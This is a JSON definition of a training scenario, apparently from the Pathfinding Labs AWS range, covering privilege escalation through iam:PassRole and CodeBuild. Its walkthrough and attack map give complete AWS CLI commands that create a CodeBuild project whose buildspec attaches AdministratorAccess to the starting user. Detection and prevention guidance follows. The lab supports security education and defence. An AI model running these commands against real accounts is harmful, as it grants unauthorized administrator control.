{
  "displayName": "CodeBuild Project Creation + Build to Admin",
  "name": "codebuild-001-iam-passrole+codebuild-createproject+codebuild-startbuild",
  "description": "Pass a privileged role to CodeBuild and execute buildspec to grant self admin access",
  "costEstimate": "$0/mo",
  "pathfindingCloudId": "codebuild-001",
  "interactiveDemo": false,
  "category": "Privilege Escalation",
  "subCategory": "new-passrole",
  "pathType": "one-hop",
  "target": "to-admin",
  "environments": [
    "prod"
  ],
  "attackPath": {
    "principals": [],
    "summary": ""
  },
  "mitreAttack": {
    "tactics": [
      "TA0004 - Privilege Escalation",
      "TA0002 - Execution"
    ],
    "techniques": [
      "T1078.004 - Valid Accounts: Cloud Accounts",
      "T1651 - Cloud Administration Command"
    ]
  },
  "terraform": {
    "variableName": "enable_single_account_privesc_one_hop_to_admin_codebuild_001_iam_passrole_codebuild_createproject_codebuild_startbuild",
    "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-admin/codebuild-001-iam-passrole+codebuild-createproject+codebuild-startbuild"
  },
  "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-admin/codebuild-001-iam-passrole+codebuild-createproject+codebuild-startbuild",
  "schemaVersion": "4.0.0",
  "permissions": {
    "principals": [
      {
        "name": "pl-prod-codebuild-001-to-admin-starting-user",
        "required": [
          {
            "permission": "codebuild:CreateProject",
            "resource": "*",
            "description": "create a new CodeBuild project with a privileged service role"
          },
          {
            "permission": "codebuild:StartBuild",
            "resource": "*",
            "description": "trigger a build that executes the malicious buildspec"
          },
          {
            "permission": "iam:PassRole",
            "resource": "arn:aws:iam::*:role/pl-prod-codebuild-001-to-admin-target-role",
            "description": "pass the privileged target role to the CodeBuild project"
          }
        ],
        "helpful": [
          {
            "permission": "iam:ListRoles",
            "purpose": "discover available privileged roles to pass to CodeBuild"
          },
          {
            "permission": "codebuild:ListProjects",
            "purpose": "list existing CodeBuild projects"
          },
          {
            "permission": "codebuild:BatchGetBuilds",
            "purpose": "monitor build execution status"
          },
          {
            "permission": "iam:ListUsers",
            "purpose": "verify admin access after escalation"
          }
        ]
      }
    ]
  },
  "readme": {
    "objective": "Your objective is to learn how to exploit a privilege escalation vulnerability that allows you to move from the `pl-prod-codebuild-001-to-admin-starting-user` IAM user to the `pl-prod-codebuild-001-to-admin-target-role` administrative role by creating a CodeBuild project with a privileged service role and executing a malicious buildspec that attaches `AdministratorAccess` to the starting user.\n\n- **Start:** `arn:aws:iam::{account_id}:user/pl-prod-codebuild-001-to-admin-starting-user`\n- **Destination resource:** `arn:aws:iam::{account_id}:role/pl-prod-codebuild-001-to-admin-target-role`",
    "setup": {
      "prerequisites": "1. Install the `plabs` CLI:\n   ```bash\n   brew install pathfinding-labs/tap/plabs\n   ```\n2. Configure your AWS profiles in `~/.plabs/plabs.yaml` (or run `plabs init` if you haven't already)",
      "deployNonInteractive": "```bash\nplabs enable enable_single_account_privesc_one_hop_to_admin_codebuild_001_iam_passrole_codebuild_createproject_codebuild_startbuild\nplabs apply\n```",
      "deployTui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `space` to enable it\n4. Press `d` to deploy"
    },
    "attack": {
      "resourcesCreated": "| ARN | Purpose |\n| -- | -- |\n| `arn:aws:iam::{account_id}:user/pl-prod-codebuild-001-to-admin-starting-user` | Scenario-specific starting user with access keys |\n| `arn:aws:iam::{account_id}:role/pl-prod-codebuild-001-to-admin-target-role` | Privileged role with iam:AttachUserPolicy permission, trusted by CodeBuild service |\n| `arn:aws:iam::{account_id}:policy/pl-prod-codebuild-001-to-admin-user-policy` | Policy granting codebuild:CreateProject, codebuild:StartBuild, and iam:PassRole to starting user |",
      "demoAttack": {
        "executing": "The script will:\n1. Display a step-by-step walkthrough with color-coded output\n2. Show the commands being executed and their results\n3. Verify successful privilege escalation\n4. Output standardized test results for automation",
        "resourcesCreated": "- CodeBuild project (`pl-privesc-codebuild-demo`) used to execute the malicious buildspec\n- `AdministratorAccess` policy attached to the starting user",
        "nonInteractive": "```bash\nplabs demo --list\nplabs demo codebuild-001-iam-passrole+codebuild-createproject+codebuild-startbuild\n```",
        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `r` to run the demo script"
      },
      "cleanup": {
        "nonInteractive": "```bash\nplabs cleanup --list\nplabs cleanup codebuild-001-iam-passrole+codebuild-createproject+codebuild-startbuild\n```",
        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `c` to run the cleanup script"
      }
    },
    "teardown": {
      "nonInteractive": "```bash\nplabs disable enable_single_account_privesc_one_hop_to_admin_codebuild_001_iam_passrole_codebuild_createproject_codebuild_startbuild\nplabs apply\n```",
      "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `space` to disable it\n4. Press `D` to destroy"
    },
    "defend": {
      "cspm": {
        "whatToDetect": "- **Dangerous Permission Combination**: User/role with both `codebuild:CreateProject` and `iam:PassRole` permissions\n- **Overly Permissive Service Roles**: CodeBuild service roles with powerful IAM permissions (`iam:AttachUserPolicy`, `iam:PutUserPolicy`, etc.)\n- **Privilege Escalation Path**: Automated detection of the complete attack chain from user to admin via CodeBuild\n- **Missing Constraints**: `iam:PassRole` permission without resource-based restrictions\n- **Service Trust Relationships**: Roles that can be assumed by CodeBuild without additional conditions",
        "prevention": "- **Restrict iam:PassRole**: Limit `iam:PassRole` to specific, least-privilege roles using resource-based conditions: `\"Resource\": \"arn:aws:iam::*:role/specific-safe-role\"`\n- **Separate Permissions**: Avoid granting `codebuild:CreateProject` and `iam:PassRole` to the same principal\n- **Service Role Controls**: Ensure CodeBuild service roles follow least privilege and cannot modify IAM permissions\n- **Service Control Policies**: Implement SCPs to prevent CodeBuild service roles from modifying IAM policies: `Deny iam:AttachUserPolicy, iam:PutUserPolicy, iam:AttachRolePolicy, iam:PutRolePolicy when aws:PrincipalServiceName = codebuild.amazonaws.com`\n- **IAM Access Analyzer**: Use AWS IAM Access Analyzer to identify privilege escalation paths involving CodeBuild\n- **Condition Keys**: Use IAM condition keys to restrict CodeBuild project creation to specific source repositories or environments"
      },
      "cloudSiem": {
        "cloudTrailEvents": "- `IAM: PassRole` -- Role passed to CodeBuild service; critical when the target role has elevated IAM permissions\n- `CodeBuild: CreateProject` -- New CodeBuild project created; high severity when a privileged service role is specified\n- `CodeBuild: StartBuild` -- Build execution triggered; monitor for inline buildspec overrides containing AWS CLI commands\n- `IAM: AttachUserPolicy` -- Managed policy attached to a user; critical when AdministratorAccess is attached from a CodeBuild service principal",
        "detonationLogs": "_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._"
      }
    },
    "guidedWalkthrough": "# Guided Walkthrough: Privilege Escalation via CodeBuild Service Abuse\n\nThis scenario demonstrates a privilege escalation vulnerability where a user has permissions to create and execute AWS CodeBuild projects combined with the ability to pass IAM roles. The attacker can create a CodeBuild project with a privileged service role, then execute a malicious buildspec that uses that role's permissions to grant themselves administrator access.\n\nAWS CodeBuild is a fully managed continuous integration service that compiles source code and runs builds in isolated compute environments. Each CodeBuild project executes with a service role that grants it permissions to perform operations. When a user has both `codebuild:CreateProject` and `iam:PassRole` permissions, they can create a project that assumes a privileged role. By starting a build with a custom buildspec, they can execute arbitrary AWS CLI commands with the role's elevated permissions.\n\nThis is a classic example of the \"pass role to service\" privilege escalation pattern, where the combination of service creation permissions and role passing creates an indirect path to elevated privileges that might not be obvious when reviewing IAM policies individually.\n\n## The Challenge\n\nYou start as `pl-prod-codebuild-001-to-admin-starting-user`, an IAM user whose credentials are provisioned by Terraform when the scenario is enabled. Your user has three key permissions: `codebuild:CreateProject`, `codebuild:StartBuild`, and `iam:PassRole` scoped to `pl-prod-codebuild-001-to-admin-target-role`.\n\nYour goal is to achieve effective administrator access in the AWS account. Right now you cannot list IAM users, create resources freely, or perform any sensitive operation \u2014 your permissions are intentionally narrow. The path to admin runs through a privileged IAM role that trusts the CodeBuild service.\n\n## Reconnaissance\n\nFirst, confirm who you are and what account you're working in:\n\n```bash\nexport AWS_ACCESS_KEY_ID=\"<starting_user_access_key_id>\"\nexport AWS_SECRET_ACCESS_KEY=\"<starting_user_secret_access_key>\"\nunset AWS_SESSION_TOKEN\n\naws sts get-caller-identity\n```\n\nThis will show your user ARN: `arn:aws:iam::{account_id}:user/pl-prod-codebuild-001-to-admin-starting-user`.\n\nNext, verify that you cannot currently perform privileged actions \u2014 trying to list IAM users should fail:\n\n```bash\naws iam list-users --max-items 1\n# Expected: AccessDenied\n```\n\nNow look for IAM roles that trust the CodeBuild service and that you're allowed to pass:\n\n```bash\naws iam list-roles --query \"Roles[?AssumeRolePolicyDocument.Statement[?Principal.Service=='codebuild.amazonaws.com']].[RoleName,Arn]\" --output table\n```\n\nYou'll find `pl-prod-codebuild-001-to-admin-target-role`. This role has `iam:AttachUserPolicy` permission and trusts `codebuild.amazonaws.com` \u2014 meaning any CodeBuild project you pass it to will execute builds with the ability to modify IAM policies.\n\n## Exploitation\n\nThe plan is straightforward: create a CodeBuild project configured to use the privileged role, embed a buildspec that attaches `AdministratorAccess` to your user, then trigger the build.\n\n### Step 1: Create the CodeBuild project\n\nBuild the inline buildspec and create the project, passing the target role as its service role:\n\n```bash\nACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)\nTARGET_ROLE_ARN=\"arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-codebuild-001-to-admin-target-role\"\nSTARTING_USER=\"pl-prod-codebuild-001-to-admin-starting-user\"\n\naws codebuild create-project \\\n  --name pl-privesc-codebuild-demo \\\n  --source \"{\\\"type\\\":\\\"NO_SOURCE\\\",\\\"buildspec\\\":\\\"version: 0.2\\\\nphases:\\\\n  build:\\\\n    commands:\\\\n      - aws iam attach-user-policy --user-name ${STARTING_USER} --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\\\"}\" \\\n  --artifacts type=NO_ARTIFACTS \\\n  --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:7.0,computeType=BUILD_GENERAL1_SMALL \\\n  --service-role \"$TARGET_ROLE_ARN\"\n```\n\nWhen you provide `--service-role`, CodeBuild will assume `pl-prod-codebuild-001-to-admin-target-role` every time a build runs. Your `iam:PassRole` permission is what makes this step legal \u2014 without it, the API call would be denied.\n\n### Step 2: Start the build\n\nTrigger the build to execute the buildspec:\n\n```bash\nBUILD_RESULT=$(aws codebuild start-build --project-name pl-privesc-codebuild-demo --output json)\nBUILD_ID=$(echo \"$BUILD_RESULT\" | jq -r '.build.id')\necho \"Build started: $BUILD_ID\"\n```\n\n### Step 3: Wait for the build to complete\n\nPoll until the build finishes. CodeBuild spins up a fresh container, assumes the target role, and runs your buildspec commands with that role's permissions:\n\n```bash\nwhile true; do\n  STATUS=$(aws codebuild batch-get-builds --ids \"$BUILD_ID\" --query 'builds[0].buildStatus' --output text)\n  echo \"Build status: $STATUS\"\n  [ \"$STATUS\" = \"SUCCEEDED\" ] && break\n  [ \"$STATUS\" = \"FAILED\" ] && { echo \"Build failed\"; exit 1; }\n  sleep 10\ndone\n```\n\nThe build typically completes in 30-60 seconds. Once `SUCCEEDED`, the buildspec has run `iam:AttachUserPolicy` as the target role, attaching `AdministratorAccess` to your starting user.\n\nWait an additional 15 seconds for IAM policy propagation before verifying:\n\n```bash\nsleep 15\n```\n\n## Verification\n\nConfirm that your starting user now has administrator access:\n\n```bash\naws iam list-users --max-items 3 --output table\n```\n\nThis should succeed \u2014 previously it returned `AccessDenied`. You can also verify the policy attachment directly:\n\n```bash\naws iam list-attached-user-policies --user-name pl-prod-codebuild-001-to-admin-starting-user\n```\n\nYou'll see `AdministratorAccess` (ARN: `arn:aws:iam::aws:policy/AdministratorAccess`) in the list, confirming the escalation succeeded.\n\n## What Happened\n\nYou exploited a \"pass role to service\" privilege escalation pattern. Your user was never granted IAM write permissions directly \u2014 but it had `iam:PassRole` to a privileged role trusted by CodeBuild, combined with the ability to create and run CodeBuild projects. By delegating work to the CodeBuild service (which ran as the privileged role), you caused that role to perform an IAM action on your behalf that you could not perform yourself.\n\nThis attack pattern is particularly dangerous in real environments because the two permissions involved \u2014 `codebuild:CreateProject` and `iam:PassRole` \u2014 are often granted separately for legitimate reasons (developers need to set up CI/CD pipelines; operators need to manage service roles). The risk is invisible unless you analyze the combined effect: a user who can create CodeBuild projects and pass a role to them can effectively use that role's full permission set for anything expressible in a buildspec.\n"
  },
  "attackMap": {
    "nodes": [
      {
        "id": "starting-principal",
        "label": "Starting User",
        "type": "principal",
        "subType": "iam-user",
        "arn": "arn:aws:iam::{account_id}:user/pl-prod-codebuild-001-to-admin-starting-user",
        "description": "You have gained access to this principal's AWS IAM credentials. These could have been obtained through many real-world vectors: phishing a developer and gaining access to their workstation, compromising a browser session, exploiting a vulnerable workload running in this AWS account, discovering credentials in a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.\nRegardless of how you obtained them, you are now operating as this principal. This IAM user has codebuild:CreateProject, codebuild:StartBuild, and iam:PassRole permissions, allowing it to create a CodeBuild project with a privileged service role and execute a malicious buildspec to escalate privileges.\n"
      },
      {
        "id": "codebuild-project",
        "label": "CodeBuild Project",
        "type": "resource",
        "subType": "codebuild-project",
        "arn": "arn:aws:codebuild:{region}:{account_id}:project/pl-prod-codebuild-001-privesc-project",
        "description": "A CodeBuild project created by the attacker and configured to run with the privileged target role. The project executes a custom buildspec that uses the role's IAM permissions to attach AdministratorAccess to the starting user.\n"
      },
      {
        "id": "target-role",
        "label": "Target Role",
        "type": "principal",
        "subType": "iam-role",
        "isTarget": true,
        "arn": "arn:aws:iam::{account_id}:role/pl-prod-codebuild-001-to-admin-target-role",
        "description": "A privileged IAM role that trusts the CodeBuild service. It has iam:AttachUserPolicy permission, which allows it to attach managed policies to IAM users. By passing this role to the CodeBuild project and starting a build, the attacker causes CodeBuild to assume this role and execute the malicious buildspec \u2014 attaching AdministratorAccess to the starting user.\n"
      }
    ],
    "edges": [
      {
        "from": "starting-principal",
        "to": "codebuild-project",
        "label": "codebuild:CreateProject + iam:PassRole",
        "description": "Create a new CodeBuild project and pass the privileged target role as its service role. This binds the role's permissions to any builds executed within this project.\n",
        "hints": [
          "Use iam:ListRoles to discover IAM roles in the account \u2014 look for ones whose trust policy allows the CodeBuild service principal to assume them.",
          "Check which roles your iam:PassRole permission is scoped to \u2014 that tells you exactly which role you can delegate to a CodeBuild project.",
          "A CodeBuild project's --service-role parameter determines what IAM identity the build runs as. Passing a privileged role here means the buildspec can perform any action that role can.",
          "The buildspec is just a YAML document with shell commands. Think about what AWS CLI commands the target role can run, and write those commands into the buildspec.",
          "You do not need an existing source repository \u2014 CodeBuild supports type=NO_SOURCE, so you can supply an inline buildspec directly.",
          "Browse to https://pathfinding.cloud/paths/codebuild-001 for technique details."
        ],
        "commands": [
          {
            "description": "Create CodeBuild project with the privileged service role",
            "command": "aws codebuild create-project \\\n  --name pl-privesc-codebuild-demo \\\n  --source type=NO_SOURCE,buildspec=\"version: 0.2\\nphases:\\n  build:\\n    commands:\\n      - aws iam attach-user-policy --user-name pl-prod-codebuild-001-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\" \\\n  --artifacts type=NO_ARTIFACTS \\\n  --environment type=LINUX_CONTAINER,computeType=BUILD_GENERAL1_SMALL,image=aws/codebuild/standard:7.0 \\\n  --service-role arn:aws:iam::{account_id}:role/pl-prod-codebuild-001-to-admin-target-role\n"
          }
        ]
      },
      {
        "from": "codebuild-project",
        "to": "target-role",
        "label": "codebuild:StartBuild \u2192 iam:AttachUserPolicy",
        "description": "Start a build on the project. CodeBuild assumes the target role for the duration of the build. The buildspec executes iam:AttachUserPolicy under the role's permissions, attaching AdministratorAccess to the starting user.\n",
        "hints": [
          "Trigger the build with codebuild:StartBuild \u2014 capture the build ID from the response so you can track its progress.",
          "Use codebuild:BatchGetBuilds with the build ID to poll for completion status; the build typically takes 30-60 seconds.",
          "Once the build status shows SUCCEEDED, wait an additional ~15 seconds for IAM policy propagation before verifying your new permissions.",
          "Verify the escalation worked by attempting an action your starting user previously could not perform, such as listing IAM users."
        ],
        "commands": [
          {
            "description": "Start the build to execute the privilege escalation",
            "command": "aws codebuild start-build --project-name pl-privesc-codebuild-demo --output json"
          },
          {
            "description": "Poll until the build completes",
            "command": "aws codebuild batch-get-builds --ids <build-id> --query 'builds[0].buildStatus' --output text"
          },
          {
            "description": "Verify administrator access",
            "command": "aws iam list-users --max-items 1"
          }
        ]
      }
    ]
  },
  "hasAttackMap": true,
  "slug": "codebuild-001"
}